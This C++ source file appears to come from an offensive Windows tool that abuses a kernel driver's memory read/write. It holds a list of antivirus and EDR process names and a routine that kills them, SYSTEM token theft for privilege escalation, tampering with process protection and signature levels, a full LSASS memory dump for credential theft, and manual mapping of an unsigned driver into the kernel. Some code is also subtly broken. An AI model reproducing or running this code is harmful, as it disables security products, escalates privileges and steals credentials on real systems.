#include "DriverLoader.h"
#include "DriverWorker.hpp"
#include "Log.hpp"
#include "Utils.hpp"
#include "PEUtils.hpp"
#include "KernelUtils.hpp"
#include <psapi.h>
#include <filesystem>
#include <fstream>
#include <DbgHelp.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <unordered_set>
#include <algorithm>

#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "Dbghelp.lib")

const
wchar_t*
AvOrEdrNames[] = {
	L"MsMpEng.exe",
	L"SecurityHealthService.exe",
	L"SecurityHealthSystray.exe",
	L"MsSense.exe",
	L"SenseNdr.exe",
	L"SenseTVM.exe",
	L"NisSrv.exe",
	L"MpCmdRun.exe",
	L"MpSigStub.exe",
	L"ConfigSecurityPolicy.exe",
	L"smartscreen.exe",
	L"CSFalconService.exe",
	L"CSFalconContainer.exe",
	L"CSAgent.exe",
	L"falcon-sensor.exe",
	L"SentinelAgent.exe",
	L"SentinelAgentWorker.exe",
	L"SentinelServiceHost.exe",
	L"SentinelStaticEngine.exe",
	L"cb.exe",
	L"cbstream.exe",
	L"carbonblack.exe",
	L"RepMgr.exe",
	L"RepUtils.exe",
	L"RepUx.exe",
	L"ccSvcHst.exe",
	L"SymCorpUI.exe",
	L"SEPM.exe",
	L"SmcGui.exe",
	L"smc.exe",
	L"ccApp.exe",
	L"McShield.exe", 
	L"mfevtps.exe", 
	L"mfeann.exe", 
	L"mcapexe.exe", 
	L"ModuleCoreService.exe",
	L"mfemms.exe",
	L"PccNTMon.exe", 
	L"ntrtscan.exe", 
	L"tmlisten.exe",
	L"CNTAoSMgr.exe",
	L"TmCCSF.exe", 
	L"avp.exe",
	L"kavtray.exe", 
	L"klnagent.exe", 
	L"ksde.exe", 
	L"cytray.exe", 
	L"cyserver.exe",
	L"CyveraService.exe",
	L"xagt.exe", 
	L"fe_avk.exe", 
	L"HX.exe",
	L"HipsDaemon.exe",
	L"HipsTray.exe",
	L"ZhuDongFangYu.exe"
};




typedef USHORT RTL_ATOM, * PRTL_ATOM;

typedef
NTSTATUS
(WINAPI* pFnNtAddAtom)(
	_In_reads_bytes_opt_(Length) PCWSTR AtomName,
	_In_ ULONG Length,
	_Out_opt_ PRTL_ATOM Atom
	);

auto 
DriverLoader::GetKernelBase() -> ULONG64
{
	auto enableDebugPrivilege = []() -> BOOLEAN {
		NTSTATUS status = Utils::RtlAdjustPrivilege(20/*SeDebugPrivilege*/);
		if (!NT_SUCCESS(status))
		{
			LOG("[-] Failed to adjust privilege. Error code: 0x" << std::hex << status << " line = " << __LINE__);
			return FALSE;
		}
		return TRUE;
		};

	if (!enableDebugPrivilege())
	{
		return 0;
	}

	LPVOID	drivers[1024]{};
	DWORD	cbNeeded{};
	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
	{
		return reinterpret_cast<ULONG64>(drivers[0]);
	}

	return 0;
}


#define TEST 

BOOLEAN
DriverLoader::PrivilegeEscalation(
	ULONG64 SourceProcess,
	ULONG64 TargetProcess,
	ULONG	OffsetOfProcessToken)
{
	// Replace other driver classes.
	//std::unique_ptr<DriverProvider<BiosToolCommonDriver>> driverLoader = std::make_unique<BiosToolCommonDriver>();
	BOOLEAN bReturn{ FALSE };
	do 
	{
		
#ifdef TEST
		system("whoami");
		LOG("----------------------------------Fxxking System---------------------------------");
#endif
		ULONG64 systemToken = 0;
		if (!DriverWorker::Read((PVOID)(SourceProcess + OffsetOfProcessToken), &systemToken, sizeof(systemToken)))
		{
			LOG("[-] KernelRead System Token address : " << std::hex << (SourceProcess + OffsetOfProcessToken) << std::dec);
			break;
		}
		//LOG("[+] System Token address : " << std::hex << (SourceProcess + OffsetOfProcessToken) << " value : " << systemToken << std::dec << std::endl);

		systemToken &= ~0xF; // Clear the low 4 bits, which are used for reference counting in the token structure

		if (!DriverWorker::Write(reinterpret_cast<PVOID>(TargetProcess + OffsetOfProcessToken),
										   &systemToken,
										   sizeof(ULONG64)))
		{
			LOG("[-] KernelWrite Current Process Token address : " << std::hex << (TargetProcess + OffsetOfProcessToken) << std::dec);
			break;
		}

#ifdef TEST
		LOG("---------------------------------------------------------------------------------");
		LOG("[+] Privilege Escalation Successful!");

		system("whoami");
		LOG("-------------------------------------End-----------------------------------------");

		//system("pause");
#endif
		bReturn = TRUE;
	} while (FALSE);
	
	return bReturn;
}

BOOLEAN 
DriverLoader::SetProcessProtection(
	ULONG64			Process, 
	ULONG			OffsetOfProtection,
	PS_PROTECTION*	Protection)
{
	BOOLEAN bReturn{ FALSE };
	do
	{
		// set protection
		if (!DriverWorker::Write(reinterpret_cast<PVOID>(Process + OffsetOfProtection),
										   Protection,
										   sizeof(DriverLoader::PS_PROTECTION)))
		{
			LOG("[-] KernelWrite Current Process Protection address : " << std::hex << (Process + OffsetOfProtection) << std::dec);
			LOG("    - Protection Level: "	<< std::hex << static_cast<int>(Protection->Level) << std::dec);
			LOG("    - Protection Type: "	<< std::hex << static_cast<int>(Protection->Type) << std::dec);
			LOG("    - Protection Signer: " << std::hex << static_cast<int>(Protection->Signer) << std::dec);
			break;
		}
		/*else
		{
			LOG("[+] Successfully set process protection at address : " << std::hex << (Process + OffsetOfProtection) << std::dec);
			LOG("    - Protection Level: " << std::hex << static_cast<int>(Protection->Level) << std::dec);
			LOG("    - Protection Type: " << std::hex << static_cast<int>(Protection->Type) << std::dec);
			LOG("    - Protection Signer: " << std::hex << static_cast<int>(Protection->Signer) << std::dec);
		}*/
		
		bReturn = TRUE;
	} while (FALSE);

	return TRUE;
}

BOOLEAN 
DriverLoader::SetProcessSignatureLevel(
	ULONG64 Process,
	ULONG OffsetOfSignatureLevel, 
	UCHAR* SignatureLevel)
{
	return DriverWorker::Write(reinterpret_cast<PVOID>(Process + OffsetOfSignatureLevel),
							   SignatureLevel,
							   sizeof(UCHAR));
}


BOOLEAN
DriverLoader::GetProcessSignatureLevel(
	ULONG64 Process,
	ULONG OffsetOfSignatureLevel,
	UCHAR* SignatureLevel)
{
	UCHAR nSignatureLevel{ 0 };
	if (DriverWorker::Read(reinterpret_cast<PVOID>(Process + OffsetOfSignatureLevel),
		&nSignatureLevel,
		sizeof(UCHAR)))
	{
		*SignatureLevel = nSignatureLevel;
		return TRUE;
	}
	 
	return FALSE;
}


DriverLoader::PS_PROTECTION 
DriverLoader::GetProcessProtection(
	ULONG64 Process, 
	ULONG	OffsetOfProtection)
{
	PS_PROTECTION Protection{};
	BOOLEAN bReturn{ FALSE };
	do
	{
		// set protection
		if (!DriverWorker::Read(reinterpret_cast<PVOID>(Process + OffsetOfProtection),
								&Protection,
								sizeof(DriverLoader::PS_PROTECTION)))
		{
			LOG("[-] KernelRead Current Process Protection address : " << std::hex << (Process + OffsetOfProtection) << std::dec);
			LOG("    - Protection Level: " << std::hex << (Protection.Level) << std::dec);
			LOG("    - Protection Type: " << std::hex << (Protection.Type) << std::dec);
			break;
		}
		else
		{
			/*LOG("Porcess object " << std::hex << Process);
			LOG("OffsetOfProtection " << std::hex << OffsetOfProtection);
			auto hex = (UCHAR*)(&Protection);
			LOG("Protection " << std::hex << (int)(*hex));*/
		}

	} while (FALSE);

	return Protection;
}

BOOL 
DriverLoader::DumpLsass(
	HANDLE	ProcessHandle, 
	DWORD	Pid, 
	HANDLE  FileHandle)
{
	BOOLEAN result{ FALSE };

	MINIDUMP_TYPE dumpType = static_cast<MINIDUMP_TYPE>(
		MiniDumpWithFullMemory |
		MiniDumpWithHandleData |
		MiniDumpWithUnloadedModules |
		MiniDumpWithFullMemoryInfo |
		MiniDumpWithThreadInfo |
		MiniDumpWithTokenInformation
		);

	result = MiniDumpWriteDump(ProcessHandle, Pid, FileHandle, dumpType, nullptr, nullptr, nullptr);
	if (!result)
	{
		//LOG("MiniDumpWriteDump failed!!!");
		DWORD error = GetLastError();
		switch (error)
		{
		case ERROR_TIMEOUT:
			LOGW(L"Critical: MiniDumpWriteDump timed out - process may be unresponsive or in critical section");
			break;
		case RPC_S_CALL_FAILED:
			LOGW(L"Critical: RPC call failed - process may be a kernel-mode or system-critical process");
			break;
		case ERROR_ACCESS_DENIED:
			LOGW(L"Critical: Access denied - insufficient privileges even with protection bypass");
			break;
		case ERROR_PARTIAL_COPY:
			LOGW(L"Critical: Partial copy - some memory regions could not be read");
			break;
		default:
			LOGW(L"Critical: MiniDumpWriteDump failed " << std::hex << error);
			break;
		}
	}

	return result;
}



BOOLEAN 
DriverLoader::SetSignatureLevel(
	ULONG64 Process,
	ULONG	OffsetOfSignatureLevel, 
	PUCHAR	SignatureLevel)
{
	BOOLEAN bReturn{ FALSE };
	do
	{
		//UCHAR signatureLevel = 0xC; // SE_SIGNING_LEVEL_WINDOWS

		if (!DriverWorker::Write(reinterpret_cast<PVOID>(Process + OffsetOfSignatureLevel),
										   SignatureLevel,
										   sizeof(UCHAR)))
		{
			LOG("[-] KernelWrite Current Process Signature Level address : " << std::hex << (Process + OffsetOfSignatureLevel) << std::dec);
			break;
		}
		
		bReturn = TRUE;
	} while (FALSE);

	return TRUE;
}

VOID 
DriverLoader::KillAllAvOrEdr()
{
	std::unordered_set<std::wstring> edrSet{};
	for (size_t i = 0; i < _countof(AvOrEdrNames); ++i)
	{
		if (AvOrEdrNames[i] && *AvOrEdrNames[i] != L'\0')
		{
			edrSet.emplace(AvOrEdrNames[i]);
		}
	}

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		LOG("CreateToolhelp32Snapshot failed: " << GetLastError());
		return;
	}

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	DWORD lsassPid = 0;

	if (Process32First(hSnapshot, &pe32))
	{
		do
		{
			if (edrSet.count(pe32.szExeFile) > 0)
			{
				DriverWorker::Kill(pe32.th32ProcessID);
			}

		} while (Process32Next(hSnapshot, &pe32));
	}

	CloseHandle(hSnapshot);
}

auto DriverLoader::InitMemoryManager() ->BOOLEAN
{
	auto hNtdll = GetModuleHandleW(L"ntdll.dll");
	if (!hNtdll)
	{
		LOG("[-] Failed to get handle for ntdll.dll. Error code: " << std::hex << GetLastError() << std::dec);
		return FALSE;
	}

	pFnNtAddAtom pNtAddAtom = (pFnNtAddAtom)GetProcAddress(hNtdll, "NtAddAtom");
	if (!pNtAddAtom)
	{
		LOG("[-] Failed to get address for NtAddAtom. Error code: " << std::hex << GetLastError() << std::dec);
		return FALSE;
	}

	// call once
	pNtAddAtom(nullptr, 0, nullptr);

	return TRUE;
}

BOOLEAN 
DriverLoader::MapperDriver(
	const PUCHAR DriverData, 
	AllocationMode Mode /*= AllocationMode::AllocatePool*/)
{
	BOOLEAN bReturn{ FALSE };

	auto originalDriverPE = std::make_unique<PEUtils>(const_cast<PUCHAR>(DriverData));
	auto imageSize = originalDriverPE->GetDriverImageSize();
	if (!imageSize)
	{
		LOG("[-] Failed to get driver image size." << std::endl);
		return FALSE;
	}

	auto imageBase = originalDriverPE->GetDriverImageBase();
	if (!imageBase)
	{
		LOG("[-] Failed to get driver image base." << std::endl);
		return FALSE;
	}


	auto oep = originalDriverPE->GetEntryPoint();
	if (!oep)
	{
		LOG("[-] Failed to get driver entry point." << std::endl);
		return FALSE;
	}
	//else
	//{
	//	LOG("[+] Driver entry point offset: " << std::hex << oep << std::dec << std::endl);
	//}

	PVOID pDriverLocalBase = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, imageSize);
	if (!pDriverLocalBase)
	{
		LOG("[-] Failed to allocate memory for driver in local space." << std::endl);
		return FALSE;
	}
	//else
	//{
	//	LOG("[+] Allocated memory for driver in local space at address: " << std::hex << pDriverLocalBase << std::dec << std::endl);
	//}

	// copy headers and sections to local buffer
	memcpy(pDriverLocalBase, DriverData, originalDriverPE->GetSizeOfHeaders());

	for (const auto& sectionHeader : originalDriverPE->GetSectionHeaders())
	{
		if ((sectionHeader.Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) > 0)
		{
			continue;
		}

		auto dest = reinterpret_cast<PUCHAR>(pDriverLocalBase) + sectionHeader.VirtualAddress;
		memcpy(dest, DriverData + sectionHeader.PointerToRawData, sectionHeader.SizeOfRawData);
	}



	auto selfDriverPE = std::make_unique<PEUtils>(reinterpret_cast<PUCHAR>(pDriverLocalBase));
	// alloc memory for driver in kernel space
	PVOID pDriverKernelBase{ nullptr };
	do
	{
		if (Mode == AllocationMode::AllocatePool)
		{
			pDriverKernelBase = AllocatePool2(imageSize);
			if (!pDriverKernelBase)
			{
				LOG("[-] Failed to allocate memory for driver in kernel space." << std::endl);
				break;
			}
		}

		selfDriverPE->FixedRelocations(reinterpret_cast<ULONG64>(pDriverKernelBase) - imageBase);

		if (!selfDriverPE->FixedSecurityCookie(reinterpret_cast<ULONG64>(pDriverKernelBase)))
		{
			LOG("Failed to fix driver Security cookie.");
			break;
		}

		if (!selfDriverPE->FixedImports())
		{
			LOG("[-] Failed to fix driver imports." << std::endl);
			break;
		}
		/*else
		{
			LOG("[+] Successfully fixed driver imports." << std::endl);
		}*/

		if (!DriverWorker::Write(pDriverKernelBase,
								 pDriverLocalBase,
								 imageSize))
		{
			LOG("[-] Failed to write driver to kernel memory." << std::endl);
			break;
		}
		else
		{
			//dump write driver data for testing
			/*PUCHAR pWriteBuffer = reinterpret_cast<PUCHAR>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, imageSize));
			if (pWriteBuffer)
			{
				if (DriverWorker::->Read(pDriverKernelBase,
												 pWriteBuffer,
												 imageSize))
				{
					auto path = std::filesystem::current_path();
					path += "\\DumpedDriver.sys";

					std::ofstream ofs(path.c_str(), std::ios::binary | std::ios::out);
					if (ofs.is_open())
					{
						ofs.write(reinterpret_cast<const char*>(pWriteBuffer), imageSize);
						ofs.close();
						LOG("dump memory address: " << std::hex << pDriverKernelBase << std::dec << " to file: " << path << std::endl);
						LOG("[+] Successfully dumped driver to: " << path << std::endl);
					}
				}
				HeapFree(GetProcessHeap(), 0, pWriteBuffer);
			}*/
		}

		// call OEP run mapping driver code
		const auto oepAddress = reinterpret_cast<ULONG64>(pDriverKernelBase) + oep;
		NTSTATUS status{ STATUS_SUCCESS };
		if (!CallKernelFunction(&status,
			oepAddress,
			0,
			0))
		{
			LOG("[-] Failed to call driver entry point." << std::endl);
			break;
		}

		bReturn = TRUE;
	} while (FALSE);

	if (pDriverLocalBase)
	{
		HeapFree(GetProcessHeap(), 0, pDriverLocalBase);
	}

	return bReturn;
}

BOOLEAN 
DriverLoader::MapperDriver(
	const std::string_view DriverPath, 
	AllocationMode Mode /*= AllocationMode::AllocatePool*/)
{
	std::ifstream readFile(DriverPath, std::ios::binary | std::ios::in);
	if (!readFile.is_open())
	{
		LOG("Read mapping driver file failed!!!");
		return FALSE;
	}

	std::stringstream readBuffer{};
	readBuffer << readBuffer.rdbuf();

	auto buffer = readBuffer.str();

	return MapperDriver(reinterpret_cast<PUCHAR>(buffer.data()), Mode);
}
